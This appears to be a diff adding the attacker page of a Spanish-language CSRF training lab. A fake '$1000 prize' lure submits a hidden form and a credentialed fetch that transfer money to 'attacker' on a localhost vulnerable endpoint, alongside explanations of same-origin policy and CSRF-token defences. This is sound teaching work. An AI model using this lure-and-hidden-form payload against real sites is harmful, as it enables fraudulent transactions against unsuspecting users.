@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎁 ¡Gana $1000 Gratis! - CSRF Demo</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      padding: 2rem;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+    }
+
+    .warning-header {
+      background: #dc3545;
+      color: white;
+      padding: 1rem 2rem;
+      border-radius: 10px 10px 0 0;
+      text-align: center;
+    }
+
+    .card {
+      background: white;
+      padding: 2rem;
+      border-radius: 0 0 10px 10px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+    }
+
+    .fake-offer {
+      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+      padding: 3rem 2rem;
+      border-radius: 15px;
+      text-align: center;
+      color: white;
+      margin-bottom: 2rem;
+      animation: pulse 2s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+
+      0%,
+      100% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.05);
+      }
+    }
+
+    .fake-offer h1 {
+      font-size: 2.5rem;
+      margin-bottom: 1rem;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+    }
+
+    .fake-offer p {
+      font-size: 1.2rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .btn-claim {
+      background: #ffc107;
+      color: #000;
+      border: none;
+      padding: 1rem 3rem;
+      font-size: 1.5rem;
+      border-radius: 50px;
+      cursor: pointer;
+      font-weight: bold;
+      box-shadow: 0 4px 15px rgba(255, 193, 7, 0.4);
+      transition: all 0.3s;
+    }
+
+    .btn-claim:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 6px 20px rgba(255, 193, 7, 0.6);
+    }
+
+    .explanation {
+      background: #fff3cd;
+      border: 2px solid #ffc107;
+      padding: 1.5rem;
+      border-radius: 10px;
+      margin-top: 2rem;
+    }
+
+    .explanation h3 {
+      color: #856404;
+      margin-bottom: 1rem;
+    }
+
+    .explanation ul {
+      list-style: none;
+      padding: 0;
+    }
+
+    .explanation li {
+      padding: 0.5rem 0;
+      padding-left: 1.5rem;
+      position: relative;
+    }
+
+    .explanation li:before {
+      content: "⚠️";
+      position: absolute;
+      left: 0;
+    }
+
+    .code-box {
+      background: #2d2d44;
+      color: #4af626;
+      padding: 1rem;
+      border-radius: 8px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+      overflow-x: auto;
+      margin: 1rem 0;
+    }
+
+    .hidden-form {
+      display: none;
+    }
+
+    .attack-log {
+      background: #1e1e2e;
+      color: #4af626;
+      padding: 1rem;
+      border-radius: 8px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.85rem;
+      margin-top: 1rem;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+
+    .log-entry {
+      margin: 0.25rem 0;
+    }
+
+    .success {
+      color: #4af626;
+    }
+
+    .error {
+      color: #ff4444;
+    }
+
+    .info {
+      color: #3498db;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="warning-header">
+      <h2>🚨 CSRF Attack Simulation - Sitio Malicioso</h2>
+      <p>Esta es una demostración educativa de un ataque CSRF</p>
+    </div>
+
+    <div class="card">
+      <!-- Fake Offer -->
+      <div class="fake-offer">
+        <h1>🎁 ¡FELICIDADES!</h1>
+        <p>¡Has sido seleccionado para ganar $1000 GRATIS!</p>
+        <p>Haz clic abajo para reclamar tu premio</p>
+        <button class="btn-claim" onclick="claimPrize()">
+          🎉 ¡RECLAMAR MI PREMIO! 🎉
+        </button>
+      </div>
+
+      <!-- Hidden CSRF Form -->
+      <form id="csrfForm" class="hidden-form" action="http://localhost:3101/api/vulnerable/csrf/transfer-money"
+        method="POST">
+        <input name="toUser" value="attacker">
+        <input name="amount" value="1000">
+      </form>
+
+      <!-- Explanation -->
+      <div class="explanation">
+        <h3>🔍 ¿Qué Está Pasando Aquí?</h3>
+        <p>Este es un <strong>sitio malicioso</strong> que simula un ataque CSRF.</p>
+
+        <p><strong>⚠️ IMPORTANTE - Punto Educativo:</strong></p>
+        <ul>
+          <li><strong>CSRF real funciona con COOKIES</strong>, no con JWT en localStorage</li>
+          <li>Las cookies se envían automáticamente en cada petición</li>
+          <li>JWT en Authorization header requiere JavaScript explícito</li>
+          <li>Same-Origin Policy impide que un sitio (localhost:3002) lea localStorage de otro (localhost:3100)</li>
+          <li><strong>Esto es CORRECTO por seguridad</strong></li>
+        </ul>
+
+        <p><strong>🎓 En un CSRF real con cookies:</strong></p>
+        <ul>
+          <li>Usuario está autenticado con cookies en banco.com</li>
+          <li>Usuario visita sitio-malicioso.com</li>
+          <li>Sitio malicioso envía formulario a banco.com</li>
+          <li>Navegador incluye cookies automáticamente</li>
+          <li>Banco ejecuta transferencia sin verificar origen</li>
+        </ul>
+
+        <p><strong>💡 Para ver el ataque en acción:</strong></p>
+        <ul>
+          <li>Usa el demo directamente en <code>localhost:3100/vulnerabilities/csrf</code></li>
+          <li>Este sitio atacante sirve para ENTENDER el concepto</li>
+        </ul>
+      </div>
+
+      <!-- Attack Code -->
+      <div class="code-box">
+        &lt;!-- Código del Ataque CSRF --&gt;<br>
+        &lt;form id="csrfForm" action="http://localhost:3101/api/vulnerable/csrf/transfer-money" method="POST"&gt;<br>
+        &nbsp;&nbsp;&lt;input name="toUser" value="attacker"&gt;<br>
+        &nbsp;&nbsp;&lt;input name="amount" value="1000"&gt;<br>
+        &lt;/form&gt;<br>
+        <br>
+        &lt;script&gt;<br>
+        &nbsp;&nbsp;// Usuario hace clic en botón "inocente"<br>
+        &nbsp;&nbsp;document.getElementById('csrfForm').submit();<br>
+        &lt;/script&gt;
+      </div>
+
+      <!-- Attack Log -->
+      <div class="attack-log" id="attackLog">
+        <div class="log-entry info">💻 Sitio malicioso cargado...</div>
+        <div class="log-entry info">⏳ Esperando interacción del usuario...</div>
+      </div>
+
+      <!-- Mitigation -->
+      <div class="explanation">
+        <h3>🛡️ Cómo Protegerse</h3>
+        <p><strong>Versión Vulnerable:</strong></p>
+        <ul>
+          <li>Solo verifica autenticación (JWT/Cookie)</li>
+          <li>NO verifica el origen de la petición</li>
+          <li>Cualquier sitio puede hacer la petición</li>
+        </ul>
+        <br>
+        <p><strong>Versión Segura:</strong></p>
+        <ul>
+          <li>Genera token CSRF único por sesión</li>
+          <li>Token guardado en el cliente (NO en cookie)</li>
+          <li>Servidor valida token en cada petición crítica</li>
+          <li>Sitios maliciosos NO pueden obtener el token</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function addLog(message, type = 'info') {
+      const log = document.getElementById('attackLog');
+      const entry = document.createElement('div');
+      entry.className = `log-entry ${type}`;
+      entry.textContent = message;
+      log.appendChild(entry);
+      log.scrollTop = log.scrollHeight;
+    }
+
+    async function claimPrize() {
+      addLog('🎯 Usuario hizo clic en el botón...', 'info');
+      addLog('📤 Enviando formulario oculto CSRF...', 'info');
+
+      try {
+        // EXPLICACIÓN: Same-Origin Policy
+        addLog('ℹ️ NOTA EDUCATIVA:', 'info');
+        addLog('  Este sitio (localhost:3002) NO puede leer localStorage de localhost:3100', 'info');
+        addLog('  Esto es CORRECTO por seguridad (Same-Origin Policy)', 'info');
+        addLog('', 'info');
+
+        const form = document.getElementById('csrfForm');
+        const formData = new FormData(form);
+
+        // Intentar leer token (fallará en diferentes orígenes)
+        let token = null;
+        try {
+          // En algunos casos de localhost esto podría funcionar
+          // pero en producción con dominios diferentes, esto fallaría
+          token = localStorage.getItem('token');
+          if (token) {
+            addLog('⚠️ Token detectado (solo en localhost, mismo navegador)', 'info');
+            addLog('  En producción real esto NO funcionaría', 'info');
+          }
+        } catch (e) {
+          addLog('✅ Same-Origin Policy bloqueó acceso al token (correcto)', 'success');
+        }
+
+        if (!token) {
+          addLog('', 'info');
+          addLog('🎓 PUNTO EDUCATIVO IMPORTANTE:', 'info');
+          addLog('  CSRF real funciona con COOKIES, no con JWT en localStorage', 'info');
+          addLog('  Las cookies se envían automáticamente por el navegador', 'info');
+          addLog('  JWT en Authorization header requiere JavaScript', 'info');
+          addLog('  → Un sitio malicioso NO puede leerlo', 'info');
+          addLog('', 'info');
+          addLog('❌ Demo bloqueada: no hay token disponible', 'error');
+          addLog('', 'info');
+          addLog('💡 PARA VER EL ATAQUE:', 'info');
+          addLog('  1. Haz login en localhost:3100/vulnerabilities/authentication-failures', 'info');
+          addLog('  2. Luego usa localhost:3100/vulnerabilities/csrf directamente', 'info');
+          addLog('  3. El sitio atacante solo sirve para ENTENDER el concepto', 'info');
+          return;
+        }
+
+        addLog('', 'info');
+        addLog('🔓 Intentando ataque con token encontrado...', 'info');
+
+        const headers = {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`
+        };
+
+        const response = await fetch(form.action, {
+          method: 'POST',
+          body: JSON.stringify({
+            toUser: formData.get('toUser'),
+            amount: parseInt(formData.get('amount'))
+          }),
+          headers: headers,
+          credentials: 'include'
+        });
+
+        const data = await response.json();
+
+        if (response.ok && data.success) {
+          addLog('✅ ¡Ataque CSRF exitoso!', 'success');
+          addLog(`💸 ${data.message}`, 'success');
+          addLog('⚠️ ' + (data.warning || 'Transferencia completada sin CSRF protection'), 'error');
+
+          // Fake prize message
+          setTimeout(() => {
+            alert('🎉 ¡Felicidades! Tu "premio" ha sido procesado... 😈\n\n(En realidad acabas de transferir $1000 al atacante debido a CSRF)');
+          }, 1000);
+        } else {
+          addLog('❌ Ataque bloqueado: ' + (data.error || 'Error desconocido'), 'error');
+          if (response.status === 401) {
+            addLog('ℹ️ Necesitas estar autenticado primero', 'info');
+            addLog('ℹ️ Ve a Authentication Failures y haz login con admin:admin123', 'info');
+          }
+        }
+      } catch (error) {
+        addLog('❌ Error de red: ' + error.message, 'error');
+        addLog('ℹ️ Posibles causas:', 'info');
+        addLog('  - Backend no está corriendo en localhost:3101', 'info');
+        addLog('  - Error de CORS (revisa consola del navegador)', 'info');
+        addLog('  - No estás autenticado (haz login primero)', 'info');
+        console.error('Error completo:', error);
+      }
+    }
+
+    // Simular actividad inicial
+    setTimeout(() => {
+      addLog('🕵️ Sitio malicioso listo para atacar...', 'info');
+    }, 1000);
+  </script>
+</body>
+
+</html>
